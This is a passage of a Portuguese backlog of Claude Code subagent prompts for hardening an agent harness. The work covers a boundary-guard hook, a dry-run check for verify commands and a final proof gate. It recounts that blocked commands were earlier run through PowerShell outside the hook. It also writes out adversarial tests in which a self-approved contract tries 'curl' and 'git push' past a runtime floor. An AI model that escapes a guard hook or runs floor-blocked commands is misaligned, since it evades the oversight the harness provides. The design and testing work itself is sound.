  > string crua, exatamente como `verify.py:127-134` executa o `verify_cmd`
  > de verdade (sem isso, no Windows, comandos que são shims `.cmd` como
  > `ng`/`npm`/`npx` levantam `FileNotFoundError` sem `shell=True`, e o
  > dry-check reportaria 'comando não encontrado' pra um `verify_cmd`
  > perfeitamente válido — bug que inverteria o propósito desta tarefa).
  > Dentro de um `try`: se o processo TERMINAR dentro do timeout com
  > `returncode != 0`, devolve uma string de warning que nomeia as DUAS
  > causas possíveis, sem insinuar bug (ex.:
  > `f"verify_cmd '{verify_cmd}' falhou rápido (exit {proc.returncode}) — "
  > f"pode ser flag/opção inválida OU, se a tarefa ainda não foi "
  > f"implementada, o resultado esperado de um teste que ainda falha "
  > f"(fluxo TDD): {proc.stderr.strip().splitlines()[-1] if proc.stderr.strip() else '(sem stderr)'}"`);
  > se terminar com `returncode == 0`, devolve `None`; se estourar
  > `subprocess.TimeoutExpired`, devolve `None` (comando ainda rodando =
  > sinal de teste de verdade em andamento — trate como são, e mate o
  > processo do timeout, `proc.kill()`, pra não vazar). Capture
  > `FileNotFoundError`/`OSError` também e devolva warning
  > (`f"verify_cmd '{verify_cmd}' — comando não encontrado: {exc}"`) — esse
  > caso É confiável mesmo com `shell=True` (o shell em si não encontrar o
  > binário é erro real, diferente do `FileNotFoundError` do Python tentando
  > exec direto sem shell).
  >
  > Mude a assinatura de `compile_contract` para
  > `compile_contract(target_dir: Path, slug: str, *, dry_run_verify: bool = False) -> Path`
  > (parâmetro novo com default `False` — NENHUM chamador existente muda de
  > comportamento). Se `dry_run_verify` for `True`, depois de montar `features`
  > (linha ~340) e ANTES de escrever o `feature_list_path` (linha ~349), itere
  > `tasks` (a lista de `Task` já disponível na função — NÃO `features`, que
  > são dicts sem o mesmo objeto `cwd` tipado), deduplicando por
  > `(task.verify_cmd, task.cwd)` — o mesmo `verify_cmd` com `cwd`
  > diferentes é um comando DIFERENTE na prática (monorepo). Pra cada par
  > único, chame `_dry_check_verify_cmd(verify_cmd, cwd=(target_dir / task.cwd)
  > if task.cwd else target_dir, timeout=8.0)` e escreva cada warning
  > não-`None` em `sys.stderr` prefixado com `"aviso: "` — SEM levantar
  > exceção, sem impedir a escrita do `feature_list.json`. Adicione os
  > imports `subprocess` e `sys` no topo do módulo se ainda não existirem.
  >
  > Em `src/harness/cli.py`, no `add_parser('compile-contract', ...)` (linha
  > ~49), adicione `cc.add_argument('--dry-run-verify', action='store_true',
  > help='Roda cada verify_cmd com timeout curto e avisa (stderr) se falhar '
  > 'rápido — não bloqueia a compilação')`. No handler (linha ~171), passe
  > `dry_run_verify=args.dry_run_verify` pra `compile_contract(...)`.
  >
  > Não toque em `skills/plan/SKILL.md` — isso é outra tarefa."
- **🧪 Critério de Validação (DoD):**
  - [ ] `python -m ruff check src/harness/contract.py src/harness/cli.py` — limpo
  - [ ] `$env:PYTHONPATH = "src"; python -m pytest tests/test_contract.py tests/test_cli.py -q` — verde, sem regressão (chamadas existentes de `compile_contract` sem o novo kwarg continuam funcionando)
  - [ ] Teste novo em `tests/test_contract.py`: contrato com `verify_cmd`
        inválido de propósito (ex.: `"python -c \"import sys; sys.exit(1)\""`,
        rápido e determinístico, sem depender de ferramenta externa
        instalada) + `dry_run_verify=True` — captura stderr (`capsys` do
        pytest) e confirma que contém o `verify_cmd` e a palavra
        "falhou"/"failed"; `compile_contract` retorna normalmente (Path
        válido, sem exceção) e `feature_list.json` foi escrito
  - [ ] Teste novo — prova do fix do shell (Windows): `verify_cmd` que
        aciona um shim `.cmd`/`.bat` real (se não houver `npm`/`node`
        garantido no ambiente de CI, use um `.cmd` de fixture criado no
        próprio teste, ex.: `Set-Content -Path fake.cmd -Value "@exit /b 0"`
        e `verify_cmd = "fake.cmd"`) — confirma que `_dry_check_verify_cmd`
        NÃO devolve warning de "comando não encontrado" pra esse caso (prova
        negativa de que a chamada usa `shell=True`)
  - [ ] **Teste novo — prova adversarial do floor (BLOQUEANTE, não pular):**
        `_dry_check_verify_cmd("curl https://example.com", cwd=...)` com
        `subprocess.run` mockado/spy — assert `subprocess.run.assert_not_called()`
        (não só que devolveu warning: o processo de rede NUNCA sobe) e que
        a string de warning devolvida cita "floor". Repita com
        `"git push origin main"`. Rode também via `compile_contract(...,
        dry_run_verify=True)` ponta a ponta com um contrato cujo `verify_cmd`
        é `"curl https://example.com"` — mesmo assert de `assert_not_called()`,
        aviso de floor em stderr, `compile_contract` retorna normalmente
        (compilar não trava, só nunca executa o floor)
  - [ ] Teste novo: `verify_cmd` que estoura o timeout (ex.:
        `"python -c \"import time; time.sleep(60)\""` com `timeout` do teste
        reduzido via parâmetro, ou mock de `subprocess.run` levantando
        `TimeoutExpired`) — NENHUM warning em stderr, compile passa normal
  - [ ] Teste novo: `dry_run_verify=False` (default) — nenhum subprocess é
        spawnado (mock/spy em `subprocess.run` com `assert_not_called()`)
  - [ ] Prova manual real (PowerShell): reproduza o cenário do relato —
        contrato com `verify_cmd: "ng test --config=nao-existe.json"` (ou
        qualquer CLI instalada localmente + flag inválida) + `--dry-run-verify`
        — confirme que o aviso aparece em stderr sem o processo `compile-contract` sair com exit≠0

---

### [SUBAGENTE 04] - Itens 4 e 5 + nota do `--dry-run-verify`: `skills/plan/SKILL.md` (depende de 03)

- **🎯 Objetivo:** Documentar três orientações de autoria de `Plans.md`/uso
  do CLI que não são (ou não deveriam ser) enforçáveis por código sozinho:
  granularidade por-arquivo em linguagem compilada; ausência de trava de
  concorrência em `feature_list.json`; e a existência do
  `--dry-run-verify` (SUBAGENTE 03) como recomendação de uso no Passo 6 —
  pra quem escreve/aprova contratos saber com antecedência em vez de
  descobrir na prática (como o usuário descobriu nesta sessão). Depende do
  SUBAGENTE 03 porque os dois tocam `skills/plan/SKILL.md`; rodando depois,
  evita colisão de edição no mesmo arquivo.
- **📂 Escopo de Arquivos:**
  - Ler: `skills/plan/SKILL.md` linhas 95-149 (formato de `Plans.md`, regras
    de `files`/`verify`/`depends`, Passo 5 e 6, especialmente o bloco de
    código do comando de compile no Passo 6, linhas ~132-142)
  - Modificar: `skills/plan/SKILL.md` (só texto — nenhum código)
- **🤖 Prompt para o Claude Code:**
  > "Claude, em `skills/plan/SKILL.md`, logo depois do bloco de 'Regras de
  > formato' (linha ~114, depois da linha sobre `depends`) e ANTES do
  > cabeçalho '## Passo 5' (linha ~116), adicione uma subseção nova:
  >
  > ```markdown
  > ### Granularidade de tarefas em linguagens compiladas
  >
  > Para linguagens com unidade de compilação (C#/.csproj, Java/módulo
  > Maven-Gradle, Go/pacote, Rust/crate): uma tarefa que toca só PARTE dos
  > arquivos de uma unidade de compilação nunca fecha `verify_cmd` sozinha —
  > o `dotnet build`/`mvn compile`/`go build` da unidade inteira só passa
  > quando TODAS as tarefas daquela unidade tiverem pousado. Duas opções ao
  > planejar: (a) agrupe tarefas da mesma unidade de compilação num único
  > `[T-XX]` com todos os arquivos em `files`, ou (b) mantenha tarefas
  > separadas mas avise no `spec.md` que o `verify_cmd` delas só fica verde
  > depois que o conjunto todo landar — não é bug do harness, é como
  > compiladores funcionam; planejar sem isso gera uma tarefa que nunca
  > verifica isolada.
  >
  > ### Concorrência em `feature_list.json` (times paralelos)
  >
  > `.harness/feature_list.json` não tem trava de escrita — se múltiplos
  > agentes/sessões tentam marcar `passes:true` em paralelo no mesmo
  > arquivo, há corrida. Enquanto o driver multi-sessão da Fase 6
  > (`docs/roadmap-autonomous.md`, um agente por feature por vez) não
  > existir, centralize as transições `passes:true` numa única sessão
  > orquestradora quando trabalhar com múltiplos agentes em paralelo — não
  > deixe cada agente editar `feature_list.json` por conta própria.
  > ```
  >
  > No Passo 6 (linha ~132-142), depois do bloco de código com o comando
  > `python -m harness.cli compile-contract --dir <alvo> --slug <slug>`,
  > adicione um parágrafo recomendando `--dry-run-verify` (flag opcional,
  > `SUBAGENTE 03` deste backlog) ao compilar contratos com `verify_cmd` de
  > ferramentas de linha de comando com flags (ex.: `ng test --config=...`),
  > deixando explícito que: (a) avisos saem em stderr e NÃO bloqueiam a
  > compilação; (b) um `verify_cmd` de tarefa TDD recém-planejada
  > (teste ainda não escrito) TAMBÉM falha rápido por natureza — um aviso
  > não é necessariamente bug, é sinal pra ler antes de aprovar o contrato,
  > não pra assumir erro automaticamente.
  >
  > Não mude nenhuma outra seção do arquivo, não mude o formato de
  > `Plans.md` em si, não invente sintaxe nova de campo."
- **🧪 Critério de Validação (DoD):**
  - [ ] Diff de `skills/plan/SKILL.md` toca só as linhas dos blocos novos (nenhuma reformatação de texto pré-existente)
  - [ ] `Select-String -Path skills/plan/SKILL.md -Pattern "unidade de compilação"` retorna match
  - [ ] `Select-String -Path skills/plan/SKILL.md -Pattern "trava de escrita"` retorna match
  - [ ] `Select-String -Path skills/plan/SKILL.md -Pattern "dry-run-verify"` retorna match
  - [ ] Nenhum teste quebra: `$env:PYTHONPATH = "src"; python -m pytest tests -q` — verde (arquivo é só doc, não deveria afetar nada, mas confirme)

---

### [SUBAGENTE 05] - Gate: suíte completa + prova real de dogfood (depende de 01, 02, 03, 04)

- **🎯 Objetivo:** Fechar o backlog com prova executável de que os 3 itens
  de código (1, 2, 3) funcionam juntos e não regrediram nada — reproduzindo
  o cenário exato do relato original: rodar `harness`/`python -m harness.cli`
  sob contrato ativo sem escapar via PowerShell, ver a mensagem de
  feature-lock correta num JSON quebrado, e ver o aviso de `verify_cmd`
  ruim antes de aprovar. **E, o mais importante deste gate (achado do
  llm-as-judge/Opus): provar que a liberação do item 1 NÃO abriu bypass do
  runtime floor** — os testes unitários dos SUBAGENTES 01/03 já cobrem isso
  isoladamente (com mocks), mas este é o único ponto do backlog que exercita
  a cadeia INTEIRA ponta a ponta (escrever contrato malicioso → auto-aprovar
  → compilar via Bash liberado → dry-check) do jeito que um agente real
  faria, sem mock nenhum.
- **📂 Escopo de Arquivos:**
  - Ler: estado final de `src/harness/boundary_guard.py`,
    `src/harness/session_permissions.py`, `src/harness/contract.py`,
    `src/harness/verify.py`, `src/harness/cli.py`, `skills/plan/SKILL.md`
    (pós SUBAGENTES 01-04)
  - Modificar: NENHUM arquivo de código. Único efeito em disco permitido:
    diretório temporário de prova (fora do repo, ex.:
    `$env:TEMP\harness-dogfood-proof`) e a leitura da suíte de testes
    existente.
- **🤖 Prompt para o Claude Code:**
  > "Claude, rode a suíte completa primeiro:
  > `$env:PYTHONPATH = "src"; python -m pytest tests -q` — espere 100% verde
  > (a suíte roda inteira, sem gate de env var).
  >
  > Depois monte a prova de dogfood num diretório temporário limpo
  > (`New-Item -ItemType Directory -Force $env:TEMP\harness-dogfood-proof`):
  > 1. Crie `.harness/feature_list.json` com 2 features simples
  >    (`passes: false`, `verify_cmd` determinístico tipo
  >    `python -c "import sys; sys.exit(0)"`).
  > 2. Instale o hook: `python -c "from harness.boundary_guard import install_boundary_guard; install_boundary_guard('.')"`.
  > 3. **Item 1**: rode
  >    `'{"tool_name":"Bash","tool_input":{"command":"python -m harness.cli analyze --dir ."},"cwd":"."}' | python .harness\hooks\boundary_guard.py`
  >    — confirme `permissionDecision: allow`. Repita trocando o comando por
  >    `"harness verify T-01 --dir ."` — também `allow`.
  > 4. **Item 2**: monte um payload `Edit` cujo `old_string`/`new_string`
  >    produz JSON quebrado no `feature_list.json` (chave sem fechar) e rode
  >    contra o hook instalado — confirme que a razão devolvida CITA JSON
  >    inválido, não a mensagem genérica de superfície.
  > 5. **Item 3**: rode
  >    `python -m harness.cli compile-contract --dir <slug-fixture-com-verify_cmd-ruim> --slug x --dry-run-verify`
  >    (monte um `spec.md`/`Plans.md` mínimo aprovado com um `verify_cmd`
  >    que falha rápido, ex.: `python -c "import sys; sys.exit(1)"`) —
  >    confirme aviso em stderr E exit code 0.
  > 6. Confirme que NADA disso precisou de PowerShell como brecha — os
  >    passos 3 e 5 são exatamente os comandos que travavam antes, agora
  >    liberados pela via sancionada (o próprio hook/CLI), não por estar
  >    fora do matcher `Edit|Write|Bash`.
  > 7. **Prova adversarial do floor (achado do llm-as-judge/Opus — NÃO
  >    pular, é o item mais importante deste gate):** monte um contrato
  >    fixture com `Plans.md` contendo uma tarefa cujo `verify: curl
  >    https://example.com` (um domínio inofensivo é suficiente — o teste é
  >    que o processo NUNCA sobe, não que ele falha), `spec.md` já com
  >    `approved_by`/`approved_at` preenchidos (simulando o agente
  >    auto-aprovando, o cenário que o floor-check existe pra cobrir). Rode
  >    `python -m harness.cli compile-contract --dir <fixture> --slug floor-test --dry-run-verify`
  >    — confirme (a) exit code 0 (não trava a compilação), (b) stderr
  >    contém aviso citando 'floor', (c) NENHUMA conexão de rede foi feita
  >    (rode com `netsh`/monitor simples desligado — ou, mais simples e
  >    determinístico, confirme via `Get-Process` que nenhum processo `curl`
  >    chegou a subir durante a execução, capturando processos filhos antes/
  >    depois — se não der pra observar isso de fora com confiança, ao menos
  >    confirme que o teste automatizado do SUBAGENTE 03 que faz esse assert
  >    com mock passou). Repita o mesmo fluxo chamando
  >    `harness verify <id> --dir <fixture>` direto (sem `--dry-run-verify`)
  >    contra esse MESMO contrato compilado — `VerifyError` citando floor,
  >    não uma tentativa de rede.
  > Relate ao humano, em tabela, os 5 itens do relato original com o
  > veredito (corrigido/documentado) e o comando que prova cada um, MAIS uma
  > linha extra pro achado de segurança do llm-as-judge (floor bypass) com
  > o resultado do passo 7."
- **🧪 Critério de Validação (DoD):**
  - [ ] `$env:PYTHONPATH = "src"; python -m pytest tests -q` — 100% verde, zero regressão
  - [ ] Passo 3 acima: os dois comandos (`python -m harness.cli analyze`, `harness verify`) avaliam `allow`
  - [ ] Passo 4 acima: mensagem cita JSON inválido, testada por desigualdade contra a mensagem genérica de superfície
  - [ ] Passo 5 acima: `compile-contract --dry-run-verify` sai com exit 0 E imprime aviso em stderr
  - [ ] **Passo 7 acima (bloqueante): `curl` sob `--dry-run-verify` E sob `harness verify` direto — nenhum dos dois executa o comando de floor; os dois citam 'floor' na mensagem/warning**
  - [ ] Relato final ao humano com a tabela dos 5 itens do relato original + achado de segurança — status de cada um
